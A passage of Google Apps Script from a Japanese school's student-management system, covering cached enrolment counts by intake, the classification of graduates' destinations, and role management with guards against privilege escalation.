                     "不交付を削除", (gone[0] || ""), full); } catch (e) {}
  return { deleted: true };
}

// Enrolled counts per course for the PREVIOUS YEAR's equivalent intake.
//
// Uses exactly the same derivation as the 学生数 report (getLiveReportData):
// the intake comes from 学籍番号 — first 4 digits are the year, next 2 the
// month (e.g. 202610xxx -> 2026年10月). Course names are cleaned the same way,
// but WITHOUT the report's short-name step (文化 / 就職 / 進学2年), because the
// 募集状況 grid is keyed on full course names (日本語・文化2年課程 …).
// Past_DB is searched too, since last year's intake may have finished already.
function getLastYearCourseCounts(role, perms, intake) {
  if (!_hasRecruitPerm_(role, perms, "view_recruitment")) return { available: false, counts: {} };
  const m = String(intake || "").match(/(\d{4})\s*年\s*(\d{1,2})\s*月/);
  if (!m) return { available: false, counts: {} };
  const targetYear = parseInt(m[1], 10) - 1;
  const targetMonth = parseInt(m[2], 10);

  // The scan below is identical for every intake — only the year/month picked
  // out of it differs. Bucketing the whole of Central_DB + Past_DB once under a
  // SINGLE cache key means the first intake pays for it and every other intake
  // is a cache hit. Keying the cache per intake (as this used to) re-scanned
  // both sheets in full on every switch, which cost seconds each time.
  // ⚠️ RENAME THIS KEY WHENEVER THE BUCKETING RULE CHANGES. The entry lives 30
  // minutes, so without a rename the table serves the OLD numbers while the code
  // is new — indistinguishable from the change not working.
  //
  // Renamed …2 when 202604-prefix parsing arrived, then NOT renamed when 期
  // parsing replaced it, so the table kept serving the earlier no-op result for
  // half an hour. It cost two rounds of debugging a rule that was already right.
  // diagnoseLastYearCounts now compares cached against fresh and says so, because
  // remembering to rename by hand has already failed once.
  const all = _cached_('enrolByIntakeMonth4', CACHE_TTL_LONG, _enrolmentByIntakeMonthUncached_);
  const k = targetYear + "-" + targetMonth;
  return { available: all.scanned > 0, counts: all.buckets[k] || {},
           matched: all.matched[k] || 0,
           label: targetYear + "年" + targetMonth + "月" };
}

// The 期 number in the COURSE cell's prefix: "80期_進学1年6カ月課程" -> 80.
// Also accepts a bare YYYYMM prefix, which some rows may use.
//
// Measured shape of Central_DB (608 rows): prefixes are 83期 ×114, 82期 ×77,
// 80期 ×50, 81期 ×21, and 346 rows carry no prefix at all.
function _coursePrefix_(raw) {
  const s = String(raw == null ? "" : raw);
  const u = s.indexOf("_");
  if (u === -1) return null;
  const p = s.substring(0, u).trim();
  const ki = p.match(/^(\d{1,3})\s*期$/);
  if (ki) return { ki: parseInt(ki[1], 10) };
  if (/^\d{6}$/.test(p)) {
    const y = parseInt(p.substring(0, 4), 10);
    const mo = parseInt(p.substring(4, 6), 10);
    if (y >= 2000 && y <= 2100 && mo >= 1 && mo <= 12) return { y: y, mo: mo };
  }
  return null;
}

// 期 number -> intake, DERIVED FROM THE DATA rather than hardcoded.
//
// For every row carrying an NN期 prefix, take the intake its 学籍番号 reports and
// keep the most common one for that 期. Students who changed course are the
// minority — that is the whole premise of this fix — so the mode is the 期's
// true intake, and the movers are exactly the rows that disagree with it.
//
// Deriving beats an anchor constant (82期 = 2026年4月, +3 months per 期): it needs
// no maintenance, it survives a skipped or renumbered 期, and if the convention
// ever changes the diagnostic prints the derived table so the drift is visible
// rather than silent.
function _kiIntakeMap_(tabs) {
  let votes = {};
  // Central_DB only, to match the bucketing — see _enrolmentByIntakeMonthUncached_.
  ["Central_DB"].forEach(function (name) {
    const data = tabs[name];
    if (!data || data.length < 2) return;
    const idIdx = data[0].indexOf("学籍番号");
    const cIdx = data[0].indexOf("コース") !== -1 ? data[0].indexOf("コース") : data[0].indexOf("課程");
    if (idIdx === -1 || cIdx === -1) return;
    for (let i = 1; i < data.length; i++) {
      const p = _coursePrefix_(String(data[i][cIdx] || ""));
      if (!p || p.ki === undefined) continue;
      const sid = String(data[i][idIdx] || "").trim();
      if (sid.length < 6) continue;
      const y = parseInt(sid.substring(0, 4), 10), mo = parseInt(sid.substring(4, 6), 10);
      if (isNaN(y) || isNaN(mo)) continue;
      const k = y + "-" + mo;
      if (!votes[p.ki]) votes[p.ki] = {};
      votes[p.ki][k] = (votes[p.ki][k] || 0) + 1;
    }
  });
  let map = {};
  Object.keys(votes).forEach(function (ki) {
    let best = null, bestN = -1;
    Object.keys(votes[ki]).forEach(function (k) {
      if (votes[ki][k] > bestN) { bestN = votes[ki][k]; best = k; }
    });
    if (best) {
      const parts = best.split("-");
      map[ki] = { y: parseInt(parts[0], 10), mo: parseInt(parts[1], 10),
                  votes: bestN, total: Object.keys(votes[ki]).reduce(
                    function (n, k) { return n + votes[ki][k]; }, 0) };
    }
  });
  return map;
}

// The intake a course cell points at, or null to fall back to 学籍番号.
function _intakeFromCourseCell_(raw, kiMap) {
  const p = _coursePrefix_(raw);
  if (!p) return null;
  if (p.ki !== undefined) {
    const hit = kiMap && kiMap[p.ki];
    return hit ? { y: hit.y, mo: hit.mo } : null;
  }
  return { y: p.y, mo: p.mo };
}

// The bucket key for a course cell.
//
// ⚠️ ITS CONTRACT IS TO MATCH THE FRONT-END'S _simNormCourseJs. The summary
// table looks up recLastYear.counts[_simNormCourseJs(co)], so a key produced any
// other way is one the front-end can never ask for and the column shows 0.
// _normalizeCourseKana_ alone did NOT strip whitespace, so any Central_DB value
// containing a space — U+3000 included — was unreachable. That is CLAUDE.md's
// identity-by-name-string class, and tests/lastyear.test.js asserts the two stay
// in step.
//
// _normalizeCourseKana_ itself is deliberately left alone: _getRealCleanCourse_
// and getLiveReportData share it, and 学生数 is out of scope.
function _recCourseKey_(raw) {
  const s = String(raw == null ? "" : raw);
  let co = s.substring(s.indexOf("_") + 1)
    .replace(/[（(]一般[）)]/g, "")
    .replace(/\d+期/g, "");
  co = _normalizeCourseKana_(co);
  return co.replace(/[\s　]/g, "");
}

// One pass over Central_DB + Past_DB -> { "2026-4": { course: n } }.
//
// ⚠️ The intake comes from the COURSE CELL's prefix, not 学籍番号. When a student
// changes course both the prefix and the course name are rewritten, and 学籍番号
// is never reissued — so for exactly those students 学籍番号 names the intake they
// left. Bucketing by it counted them against the wrong year, inflating one and
// starving another. 学籍番号 remains the fallback for rows with no usable prefix,
// so nothing that counted before stops counting.
//
// Roughly 30 buckets of a handful of courses, so it stays far under the ~100KB
// ceiling _cached_ will refuse to store.
function _enrolmentByIntakeMonthUncached_() {
  let buckets = {}, matched = {}, scanned = 0;
  // Evidence that the rule above is doing something: `disagreed` IS the
  // moved-student population. Surfaced by diagnoseLastYearCounts.
  let fromCourseCol = 0, fromStudentId = 0, disagreed = 0;
  // ⚠️ CENTRAL_DB ONLY. Past_DB is students who withdrew or graduated, and a
  // withdrawal FREES THE SLOT — so they must not count toward an intake's
  // actuals. Including it added a withdrawn student back and made 2025年10月
  // 進学1年6か月課程 read 19 against a true 18.
  //
  // Consequence, and it is the correct one: an intake old enough that its
  // students have all graduated out of Central_DB reports no data, and the table
  // renders "-" rather than a misleading 0. 前年 is used for the upcoming intake,
  // one year back, whose students are still enrolled.
  const tabs = _readTabs_(["Central_DB"]);
  // Built first: the loop below needs 期 -> intake before it can attribute a row.
  const kiMap = _kiIntakeMap_(tabs);

  ["Central_DB"].forEach(function(name){
    const data = tabs[name];
    if (!data || data.length < 2) return;
    const headers = data[0];
    const idIdx = headers.indexOf("学籍番号");
    const courseIdx = headers.indexOf("コース") !== -1 ? headers.indexOf("コース") : headers.indexOf("課程");
    if (idIdx === -1 || courseIdx === -1) return;

    for (let i = 1; i < data.length; i++) {
      const sid = String(data[i][idIdx] || "").trim();
      if (sid.length < 6) continue;
      scanned++;

      const raw = String(data[i][courseIdx] || "");
      const fromCell = _intakeFromCourseCell_(raw, kiMap);

      // 学籍番号 as written, kept as the fallback and for the disagreement count.
      const sy = parseInt(sid.substring(0, 4), 10);
      const smo = parseInt(sid.substring(4, 6), 10);
      const sidOk = !isNaN(sy) && !isNaN(smo);

      let y, mo;
      if (fromCell)   { y = fromCell.y; mo = fromCell.mo; }
      else if (sidOk) { y = sy; mo = smo; }
      else            { continue; }   // neither source is usable

      const co = _recCourseKey_(raw);
      if (!co) continue;

      // Counted AFTER the course check, not before: a row with a usable intake
      // but no course name is never bucketed, so counting it here would make
      // these figures disagree with the totals they sit beside in the diagnostic.
      if (fromCell) {
        fromCourseCol++;
        if (sidOk && (sy !== y || smo !== mo)) disagreed++;
      } else {
        fromStudentId++;
      }

      const k = y + "-" + mo;
      if (!buckets[k]) buckets[k] = {};
      buckets[k][co] = (buckets[k][co] || 0) + 1;
      matched[k] = (matched[k] || 0) + 1;
    }
  });

  return { buckets: buckets, matched: matched, scanned: scanned,
           fromCourseCol: fromCourseCol, fromStudentId: fromStudentId,
           disagreed: disagreed, kiMap: kiMap };
}


// ============================================================================
// 進路 (post-graduation destinations) — PHASE 1: SURVEY ONLY
//
// Staff record each graduate's destination in one free-text column of the source
// spreadsheet, headed
//   決定進路【進学先名（正規課程or研究生or別科）就職先名、帰国、ビザ変更】入力
// which already syncs into Past_DB idx 22 (fetchAndMergeStudentData maps it via
// the fuzzy header match). School names, company names, 帰国, ビザ変更, and
// whatever else got typed, all in one column.
//
// ⚠️ NOTHING CLASSIFIES THIS YET, DELIBERATELY. The 前年 fix earlier today was
// attempted three times on assumed data shapes and was wrong all three times; a
// row-level dump settled it in one run. So: look first, write rules second.
// This function only reports. It is the input to the classifier, not the
// classifier.
// ============================================================================
// Past_DB columns are located by HEADER NAME, never by a positional constant.
// The sync appends columns (都道府県, 業種, 修了期 landed after 決定進路), and the
// source tabs do not agree with each other on column order — 修了2025.4~2026.3
// carries a ビザの種類 column the others lack, shifting everything to its right.
// A positional constant here was already wrong once.
function _pastCol_(headers, name) {
  const i = headers.indexOf(name);
  return i;   // -1 when absent; every caller must handle that
}

// DIAGNOSTIC (read-only). Past_DB's 決定進路 came back 1399/1400 blank, so the
// column is being created by the sync and filled by nothing. The answer is in
// the SOURCE spreadsheet, not in Past_DB — this reports what the sync actually
// sees there.
//
// Reads the source directly rather than through _readTabs_, because the bulk
// reader asks for FORMATTED_VALUE and a narrow date column comes back as
// "############". Header text is unaffected, but this way the samples are real.
function diagnoseDestinationSource() {
  _requireMaintenanceUnlock_("diagnoseDestinationSource");
  let out = [];
  let ss;
  try { ss = SpreadsheetApp.openById(_requireConfig_(CONFIG_STUDENT_SOURCE)); }
  catch (e) { return "Cannot open the source spreadsheet: " + e.message; }

  out.push("=== source: " + ss.getName() + " ===");
  out.push("  all tabs: " + ss.getSheets().map(function (s) { return s.getName(); }).join(" | "));

  // Exactly the tabs fetchAndMergeStudentData pulls into Past_DB.
  ["修了2024.3まで", "修了2024.4~2025.3", "修了2025.4~2026.3"].forEach(function (tabName) {
    let sh = null;
    ss.getSheets().forEach(function (s) {
      if (s.getName().replace(/[\s　]/g, '') === tabName.replace(/[\s　]/g, '')) sh = s;
    });
    out.push("=== " + tabName + " ===");
    if (!sh) { out.push("  ⚠️ tab not found"); return; }

    const raw = sh.getDataRange().getValues();
    out.push("  " + raw.length + " rows × " + (raw[0] ? raw[0].length : 0) + " cols");

    // The sync finds its header row by looking for a cell equal to 学籍番号. If the
    // destination header sits on a DIFFERENT row — a tall merged header is exactly
    // the shape that does this — the mapping silently returns -1 and the column
    // imports empty, which is what Past_DB shows.
    let headerRowIndex = -1;
    for (let i = 0; i < Math.min(100, raw.length); i++) {
      if (raw[i].some(function (c) { return String(c).replace(/[\s　]/g, '') === "学籍番号"; })) {
        headerRowIndex = i; break;
      }
    }
    out.push("  学籍番号 header row: " + (headerRowIndex === -1 ? "NOT FOUND" : "index " + headerRowIndex));
    if (headerRowIndex === -1) return;

    // Every non-empty header cell, so a header on the wrong row is visible.
    out.push("  --- header row " + headerRowIndex + " ---");
    raw[headerRowIndex].forEach(function (c, i) {
      const t = String(c || "").trim();
      if (t !== "") out.push("     [" + i + "] " + JSON.stringify(t));
    });

    // Any cell ANYWHERE in the first 100 rows that looks like the destination
    // header — this is what finds a header parked on another row.
    out.push("  --- cells matching 進路/進学先/就職先 anywhere in the first 100 rows ---");
    let found = 0;
    for (let r = 0; r < Math.min(100, raw.length); r++) {
      for (let c = 0; c < raw[r].length; c++) {
        const t = String(raw[r][c] || "");
        if (/進路|進学先|就職先/.test(t)) {
          out.push("     row " + r + ", col " + c + ": " + JSON.stringify(t.substring(0, 70)));
          found++;
          if (found > 12) break;
        }
      }
      if (found > 12) break;
    }
    if (found === 0) out.push("     (none — this tab has no destination column at all)");

    // Reproduce the sync's own matcher and report what it picks.
    const hdr = raw[headerRowIndex];
    let picked = -1;
    for (let c = 0; c < hdr.length; c++) {
      const rawCellText = String(hdr[c]);
      const cellText = rawCellText.replace(/[１-９]/g, function (s) {
        return String.fromCharCode(s.charCodeAt(0) - 0xFEE0);
      }).replace(/[\s　]/g, '');
      if (cellText === "") continue;
      if (cellText === "決定進路" || cellText.indexOf("決定進路") !== -1 ||
          rawCellText.indexOf("決定進路") !== -1 || rawCellText.indexOf("進路") !== -1 ||
          rawCellText.indexOf("進学先") !== -1 || rawCellText.indexOf("就職先") !== -1) {
        picked = c; break;
      }
    }
    out.push("  the sync's matcher picks: " + (picked === -1 ? "NOTHING (-1) ← the column imports empty" : "col " + picked));

    if (picked !== -1) {
      let filled = 0, samples = [];
      for (let r = headerRowIndex + 1; r < raw.length; r++) {
        const v = String(raw[r][picked] == null ? "" : raw[r][picked]).trim();
        if (v === "") continue;
        filled++;
        if (samples.length < 15) samples.push(v);
      }
      out.push("  non-empty values in that column: " + filled);
      samples.forEach(function (s) { out.push("     " + JSON.stringify(s)); });
    }
  });

  const msg = out.join("\n");
  try { console.log(msg); } catch (e) {}
  return msg;
}

// ============================================================================
// 進路 (post-graduation destinations)
//
// One free-text column, 決定進路 in Past_DB, holding 643 distinct values over
// 1404 rows: school names, company names, 帰国, 延長, 退学, and prose. Classified
// into buckets so the school can answer "where did last year's graduates go".
//
// Measured, not assumed — every rule below was scored against the real column
// before it was written. Two things that looked obvious and were wrong:
//   - a bare /進路/ header match imported 進路希望１ (the ASPIRATION column) for
//     years, so this data was 1399/1400 blank until today;
//   - "業種 filled ⇒ 就職" would have lifted coverage to 86%, but 業種 is also
//     recorded on 258 進学 and 66 帰国 rows, so it would have relabelled
//     university-bound students as employed. Rejected.
// Keyword rules alone reach ~90% of filled rows; the alias tab covers the rest.
// ============================================================================
const SHEET_DEST_ALIAS = 'Destination_Aliases';

const DEST_CATEGORIES = ["進学", "就職", "帰国", "在籍継続", "退学・除籍", "その他"];

// ⚠️ TWO TIERS, AND THE ALIAS SITS BETWEEN THEM.
//
// EXPLICIT rules state the outcome outright — 帰国, 就職, 退学, 延長 — and beat
// everything, including an alias. INFERRED rules only guess from the kind of
// institution named, so an alias beats those.
//
// The case that forced the split: 「見本本町校（ホテル）」 is a vocational school's
// HOTEL COURSE, not a hotel job. A 見本 → 進学 alias must win there. But
// 「見本（就職）」 says the outcome plainly, and then the alias must lose.
// Hence: explicit → alias → inferred.
//
// Within each tier the first hit wins, so 「帰国（就職予定）」 is 帰国.
const DEST_RULES_EXPLICIT = [
  // A stated CONDITION is not an outcome. 「就職決まらなければ帰国」 records an
  // intention; calling it 帰国 reports a student as having left when nobody knows.
  // Straight to the queue for a human instead.
  { cat: "未分類",    re: /なければ|なかったら|ない場合|未定/ },
  { cat: "帰国",      re: /帰国|帰　国/ },
  { cat: "退学・除籍", re: /退学|除籍|行方不明|休学|名前削除|連絡取れ/ },
  { cat: "在籍継続",   re: /延長|長期コース/ },
  // ⚠️ 就職 SITS ABOVE その他, and 就職活動 IS NOT 就職.
  //   - 「就職（ビザ待ち）株式会社サンプル鋳造」 has a named employer and was
  //     coming out その他, because その他's ビザ ran first.
  //   - 「特定活動(就職活動)」 is a job-hunting visa, not a job — but 就職活動
  //     contains 就職, so a bare /就職/ claimed it. The lookahead excludes it and
  //     その他 then picks it up correctly.
  { cat: "就職",      re: /就職(?!活動)|特定技能|技人国/ },
  { cat: "その他",     re: /ビザ|VISA|在留|特定活動|家族滞在|経営管理|結婚|起業|在住|滞在|両親/ },
  { cat: "進学",      re: /進学|準備教育/ }
];

// Inferred from the kind of place named. An alias outranks these because a brand
// name is a fact about the institution and these are only a guess from its name.
const DEST_RULES_INFERRED = [
  { cat: "進学", re: /大学院|大学校|大学|専門学校|専門|学院|学園|学校|短大|高専|カレッジ|ｶﾚｯｼﾞ|COLLEGE|College|アカデミー|スクール|学科|高校|予備校|ゼミナール|上級科|整備科|美術|GAKKU/ },
  { cat: "就職", re: /株式会社|\(株\)|（株）|㈱|㈲|有限会社|合同会社|会社|商事|工業|建設|運輸|サービス|ホテル|HOTEL|Hotel|hotel|病院|製作所|福祉会|法人|財団|コーポレーション|CORPORATION|Co\.|Ltd|協会|老人ホーム|カンパニー|テック|産業|グループ|ホールディングス|企画|旅行社|フーズ|ジャパン|JAPAN|マネジメント|ホスピタリティ|組合|研究所|介護|旅館|レンタ|ロジスティクス|テクノロジー|エンタテイメント|自動車|運送|物流|印刷|食品|電機|銀行|保険|不動産/ }
];

const SHEET_DEST_OVERRIDE = 'Destination_Overrides';

function _getDestOverrideSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_DEST_OVERRIDE);
  if (!sh) {
    sh = ss.insertSheet(SHEET_DEST_OVERRIDE);
    sh.appendRow(["学籍番号", "区分", "更新者", "更新日時"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// Per-STUDENT corrections: 学籍番号 -> 区分.
//
// The alias table teaches the classifier a rule about a VALUE, and applies to
// every row with that text including next year's. This corrects ONE record and
// generalises to nothing — which is the point. 「就職決まらなければ帰国」 appears
// three times and each of those students did something different; no rule about
// the text can be right for all three.
//
// Keyed by 学籍番号, so it survives the sync rewriting Past_DB.
function _destOverrides_() {
  const sh = _getDestOverrideSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let out = {};
  for (let i = 1; i < data.length; i++) {
    const sid = String(data[i][0] || "").trim();
    const cat = String(data[i][1] || "").trim();
    if (sid !== "" && cat !== "") out[sid] = cat;
  }
  return out;
}

// ============================================================================
// ROLES
//
// ⚠️ A role is NOT just a permission bundle. The built-ins carry BEHAVIOUR that
// lives in code, not data:
//   - "teacher" selects Teacher_Master over Staff_Master in five places, one of
//     them inside _resolveUserById_, which runs on EVERY login;
//   - "teacher"/"sales" decide which notification feed a user gets and how ホーム
//     scopes their interviews;
//   - "sales" has its own branch in the booking-cancellation flow;
//   - "master" is the SYSTEM_PIN account and _isAdminRole_ treats it as admin.
//
// So built-ins stay defined here and custom roles are permissions ONLY. A custom
// role is stored in Staff_Master and behaves like any staff account — it cannot
// acquire teacher behaviour by being named something teacher-ish.
const SHEET_ROLES = 'Roles';

const BUILTIN_ROLES = [
  { key: "admin",   label: "管理者",
    perms: "view_students,export_students,view_simulation,edit_simulation,view_dorms,edit_dorms,export_dorms,view_admissions,edit_admissions,export_admissions,view_interview_results,entry_interview_results,view_placement,manage_placement,view_shinsei,edit_shinsei,export_shinsei,view_recruitment,edit_recruitment,manage_recruitment,manage_users" },
  { key: "sales",   label: "営業",
    perms: "view_students,export_students,view_simulation,edit_simulation,view_dorms,edit_dorms,export_dorms,view_admissions,edit_admissions,export_admissions,view_interview_results,entry_interview_results,view_shinsei,edit_shinsei,export_shinsei,view_recruitment,edit_recruitment" },
  { key: "teacher", label: "教務",
    perms: "view_teacher_schedule,view_admissions,view_placement,view_interview_results,entry_interview_results" }
];

function _getRolesSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_ROLES);
  if (!sh) {
    sh = ss.insertSheet(SHEET_ROLES);
    sh.appendRow(["キー", "表示名", "既定の権限", "管理者権限", "更新者", "更新日時"]);
    sh.setFrozenRows(1);
  }
  _ensureRolesColumns_(sh);
  return sh;
}

const ROLES_COLS = 6;   // キー|表示名|既定の権限|管理者権限|更新者|更新日時

// 管理者権限 inserted at column D on 2026-08-07, ahead of the two audit columns.
// ⚠️ Existing sheets have 更新者/更新日時 at D/E; the widen appends F and the two
// audit columns are REWRITTEN by saveRole, so a pre-existing row keeps its old
// D/E values until it is next saved. _roles_() therefore reads the flag defensively
// and treats anything that is not an explicit "Y" as not admin — failing closed,
// which for a privilege flag is the only safe direction.
function _ensureRolesColumns_(sheet) {
  try {
    if (sheet.getMaxColumns() < ROLES_COLS) {
      sheet.insertColumnsAfter(sheet.getMaxColumns(), ROLES_COLS - sheet.getMaxColumns());
    }
    const cell = sheet.getRange(1, 4);
    if (String(cell.getDisplayValue() || "").trim() !== "管理者権限") {
      sheet.getRange(1, 4, 1, 3).setValues([["管理者権限", "更新者", "更新日時"]]);
    }
  } catch (e) { /* best-effort */ }
}

let _rolesMemo = null;

// Built-ins first, then custom. A custom row can never shadow a built-in — that
// is enforced on write, and ignored again here so a row edited directly in the
// sheet cannot smuggle one past.
function _roles_() {
  if (_rolesMemo) return _rolesMemo;
  let out = BUILTIN_ROLES.map(function (r) {
    return { key: r.key, label: r.label, perms: r.perms,
             admin: (r.key === "admin"), builtin: true };
  });
  const seen = {};
  const byKey = {};
  out.forEach(function (r) { seen[r.key] = true; byKey[r.key] = r; });
  try {
    // ⚠️ getSheetByName, NOT _getRolesSheet_ — this runs on the login path via
    // _userFromRow_, and creating a sheet there would make every first login in a
    // fresh copy of the spreadsheet write to it. Absent sheet = built-ins only.
    const sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_ROLES);
    const data = sh ? sh.getDataRange().getDisplayValues() : [];
    for (let i = 1; i < data.length; i++) {
      const key = String(data[i][0] || "").trim();
      if (key === "" || key === "master") continue;
      const label = String(data[i][1] || "").trim();
      const perms = String(data[i][2] || "").trim();
      // ⚠️ Fails closed: only a literal "Y" grants admin level. A blank, a stray
      // value, or a pre-widen row all read as false.
      const adminCell = String(data[i][3] || "").trim().toUpperCase() === "Y";

      // A row whose key names a BUILT-IN is an override, not a new role. 表示名 and
      // 既定の権限 merge onto it so 役割管理 can edit 営業/教務/管理者 — both are
      // cosmetic-or-defaults: a role's perms only pre-tick the boxes when creating a
      // user, and live access comes from the user's own row (_userFromRow_ → row[5]).
      //
      // ⚠️ `admin` and `builtin` are NEVER taken from the sheet. _isAdminLevel_ reads
      // this flag live, so a row setting 管理者権限=Y on `sales` would promote every
      // existing 営業 account the instant it saved — no per-user step, no warning.
      // That is the escalation tests/roles.test.js §1 exists to prevent, and it stays
      // prevented; only the two harmless fields merge.
      if (byKey[key]) {
        if (label !== "") byKey[key].label = label;
        if (perms !== "") byKey[key].perms = perms;
        continue;
      }
      if (seen[key]) continue;
      seen[key] = true;
      out.push({ key: key, label: label || key, perms: perms,
                 admin: adminCell, builtin: false });
    }
  } catch (e) { /* sheet unreadable — built-ins still work, which keeps logins alive */ }
  _rolesMemo = out;
  return out;
}

function _roleByKey_(key) {
  const k = String(key || "").trim();
  const all = _roles_();
  for (let i = 0; i < all.length; i++) if (all[i].key === k) return all[i];
  return null;
}

// ⚠️ Keys are compared as raw strings in ~59 places across this file. A key with
// a space, a full-width character or a comma would match in some of them and not
// others — the identity-by-name-string class that has caused the building-alias,
// course-count and 担当-matching bugs in this project. So: ASCII lower-case,
// digits and underscore only.
function _roleKeyProblem_(key) {
  const k = String(key || "").trim();
  if (k === "") return "キーを入力してください。";
  if (!/^[a-z0-9_]+$/.test(k)) return "キーは半角英小文字・数字・アンダースコアのみ使用できます。";
  if (k === "master") return "master は予約語です。";
  // ⚠️ Built-in keys are ACCEPTED here now — 役割管理 edits 営業/教務/管理者 by writing
  // an override row keyed with the built-in's key. What that row may carry is
  // policed in saveRole and _roles_(), not here: 表示名 and 既定の権限 merge, the
  // 管理者権限 flag never does. deleteRole keeps its own separate refusal, because
  // deleting 営業 would strand every account holding it.
  return "";
}

function getRoles(role, perms) {
  if (!_hasPerm_(role, perms, "manage_users")) throw new Error("権限がありません");
  return _roles_();
}

// Master only. An admin manages USERS; the master defines what roles exist —
// otherwise an admin could mint a role carrying manage_users and promote itself.
// ⚠️ `isAdmin` is the LAST parameter, and absent means NOT admin. For a privilege
// flag the only safe default is off, so a caller that forgets it cannot silently
// mint an admin-level role.
function saveRole(role, perms, key, label, permissions, actorName, actorId, isAdmin) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const k = String(key || "").trim();
  const problem = _roleKeyProblem_(k);
  if (problem) throw new Error(problem);
  const lab = String(label || "").trim() || k;
  const p = String(permissions || "").split(",").map(function (x) { return x.trim(); })
              .filter(function (x) { return x !== ""; }).join(",");

  const sh = _getRolesSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let found = -1;
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][0] || "").trim() === k) { found = i + 1; break; }
  }
  // ⚠️ A built-in NEVER gets the flag from this endpoint, whatever the caller sends.
  // _roles_() already refuses to read it back, so this is the second of two
  // independent guards on the one escalation path that matters here: flagging
  // `sales` would make every existing 営業 account admin-level with no per-user step.
  const _isBuiltinKey = BUILTIN_ROLES.some(function (b) { return b.key === k; });
  const adm = (!_isBuiltinKey && (isAdmin === true || String(isAdmin || "").toUpperCase() === "Y")) ? "Y" : "";
  if (found > 0) sh.getRange(found, 2, 1, 5).setValues([_cellSafeRow_([lab, p, adm, actorName || "", new Date()])]);
  else sh.appendRow(_cellSafeRow_([k, lab, p, adm, actorName || "", new Date()]));
  _rolesMemo = null;
  // Granting admin level is the single most consequential thing this endpoint can
  // do, so it is named in the audit entry rather than buried in the row.
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "役割を保存", k, lab + (adm ? "（管理者権限あり）" : "")); } catch (e) {}
  return { saved: true };
}

// Remove a BUILT-IN's override row, restoring the 表示名 and 既定の権限 compiled into
// BUILTIN_ROLES. ⚠️ This exists because deleteRole refuses built-in keys outright: with
// built-ins now editable, a mis-typed permission set on 営業 would otherwise be
// unfixable from the UI and would need a hand edit of the sheet.
//
// Custom roles are refused here — for those, 削除 is the right control and it carries
// the holder check that this one does not need (a built-in cannot be deleted, so its
// holders are never stranded).
function resetRoleDefaults(role, perms, key, actorName, actorId) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const k = String(key || "").trim();
  const isBuiltin = BUILTIN_ROLES.some(function (b) { return b.key === k; });
  if (!isBuiltin) throw new Error("既定に戻せるのは既定の役割だけです。");

  const sh = _getRolesSheet_();
  const data = sh.getDataRange().getDisplayValues();
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][0] || "").trim() === k) sh.deleteRow(i + 1);
  }
  _rolesMemo = null;
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "役割を既定に戻す", k, ""); } catch (e) {}
  return { reset: true };
}

// ⚠️ Refuses while anyone holds the role, and names them. Deleting it out from
// under a user leaves an account whose role matches nothing — which fails closed
// at login, i.e. a lockout with no visible cause.
function deleteRole(role, perms, key, actorName, actorId) {
  if (!_isMasterRole_(role)) throw new Error("権限がありません");
  const k = String(key || "").trim();
  for (let i = 0; i < BUILTIN_ROLES.length; i++) {
    if (BUILTIN_ROLES[i].key === k) throw new Error("既定の役割は削除できません。");
  }
  const holders = _usersWithRole_(k);
  if (holders.length) {
    throw new Error("この役割は " + holders.length + "名が使用中です（" +
                    holders.slice(0, 5).join("、") + (holders.length > 5 ? " ほか" : "") +
                    "）。先に変更してください。");
  }
  const sh = _getRolesSheet_();
  const data = sh.getDataRange().getDisplayValues();
  const hits = [];
  for (let i = data.length - 1; i >= 1; i--) {
    if (String(data[i][0] || "").trim() === k) hits.push(i);
  }
  const gone = hits.map(function (i) { return _rowForLog_(data[0], data[i]); }).join("；");
  hits.forEach(function (i) { sh.deleteRow(i + 1); });
  _rolesMemo = null;
  try { _logActivity_({ role: role, name: actorName || "", id: actorId || "" },
                     "役割を削除", k, gone); } catch (e) {}
  return { deleted: true };
}

// Names of everyone currently holding a role. Custom roles live in Staff_Master,
// but Teacher_Master is checked too so a role wrongly assigned there still blocks
// deletion rather than being silently missed.
function _usersWithRole_(key) {
  const k = String(key || "").trim();
  const tabs = _readTabs_(["Staff_Master", "Teacher_Master"]);
  let out = [];
  ["Staff_Master", "Teacher_Master"].forEach(function (name) {
    const data = tabs[name] || [];
    for (let i = 1; i < data.length; i++) {
      if (String(data[i][0] || "").trim() === "") continue;
      // The RAW cell, not _staffRoleFromRow_: that one folds an unknown role back
      // to 'sales', which would report nobody holding the role being deleted and
      // let the delete through — the exact case this check exists to catch.
      const r = name === "Staff_Master" ? String(data[i][STAFF_ROLE_IDX] || "").trim() : "teacher";
      if (r === k) out.push(String(data[i][1] || data[i][0] || "").trim());
    }
  });
  return out;
}

function _getDestAliasSheet_() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  let sh = ss.getSheetByName(SHEET_DEST_ALIAS);
  if (!sh) {
    sh = ss.insertSheet(SHEET_DEST_ALIAS);
    sh.appendRow(["パターン", "区分", "更新者", "更新日時"]);
    sh.setFrozenRows(1);
  }
  return sh;
}

// Aliases, longest pattern first.
//
// Matching is CONTAINS, not equality, and that is the point: one entry "XYZ"
// covers XYZ, XYZ（本町）, XYZ国際ビジネスITコース, XYZ 国際ICT（本町）and XYZI —
// 26 rows from a single decision. Exact matching would need a row per spelling,
// and a new one every intake.
//
// Longest-first so a specific pattern beats a general one that contains it.
function _destAliases_() {
  const sh = _getDestAliasSheet_();
  const data = sh.getDataRange().getDisplayValues();
  let out = [];
  for (let i = 1; i < data.length; i++) {
    const p = String(data[i][0] || "").trim();
    const c = String(data[i][1] || "").trim();
    if (p === "" || c === "") continue;
    out.push({ pattern: p, key: _normName_(p), cat: c });
  }
  out.sort(function (a, b) { return b.key.length - a.key.length; });
  return out;
}

// raw -> one of DEST_CATEGORIES, or 未入力 / 未分類.
//
// ⚠️ 未分類 is NOT その他. A value nobody has classified is different from one
// classified as "other", and merging them would hide the work queue that keeps
